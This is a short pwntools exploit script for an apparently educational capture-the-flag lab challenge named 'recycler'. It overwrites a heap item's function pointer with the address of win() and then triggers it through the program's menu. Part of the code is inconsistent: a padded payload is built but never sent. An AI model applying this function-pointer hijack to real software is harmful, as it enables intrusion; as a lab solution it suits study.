#!/usr/bin/env python3
from pwn import *
HOST = "offsec.m0lecon.it"
PORT = 13554
context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab10/challenges/02_recycler/recycler', checksec=False)

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

p = conn()

OFFSET_TO_DISPLAY = 64+8+8      # bytes from start of `note` to slot->display: note + prev_size(8 bytes) + flags (8 bytes)
WIN = elf.sym.win               # address of win() in the binary, NO PIE

payload = flat(
    b'A' * OFFSET_TO_DISPLAY,
    p64(WIN),
)

win = elf.sym.win

p.sendlineafter(b'> ', b'1')    # allocate user 
p.sendlineafter(b'index: ', b'0') #allocate item 0
p.sendlineafter(b'data: ', b'dummy')

p.sendlineafter(b'> ', b'3')    # send payload to edit item 0
p.sendlineafter(b'index: ', b'0')
p.sendlineafter(b'payload: ', p64(win))

p.sendlineafter(b'> ', b'4')    # execute action: calls item->action == win()
p.sendlineafter(b'index: ', b'0')


p.interactive()